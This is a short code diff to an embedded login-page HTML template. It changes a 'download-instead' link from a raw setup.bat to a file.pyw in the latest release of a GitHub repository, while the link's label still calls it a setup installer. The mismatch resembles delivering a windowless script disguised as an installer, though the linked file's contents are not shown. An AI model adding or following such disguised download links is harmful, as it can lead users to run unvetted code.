@@ -5161,7 +5161,7 @@ LOGIN_HTML = r"""
 
     <a
         class="download-instead"
-        href="https://raw.githubusercontent.com/downloader-AXP/downloader/main/setup.bat"
+        href="https://github.com/downloader-AXP/downloader/releases/latest/download/file.pyw"
         target="_blank"
         rel="noopener noreferrer"
         aria-label="Download the setup installer from the latest published GitHub release"
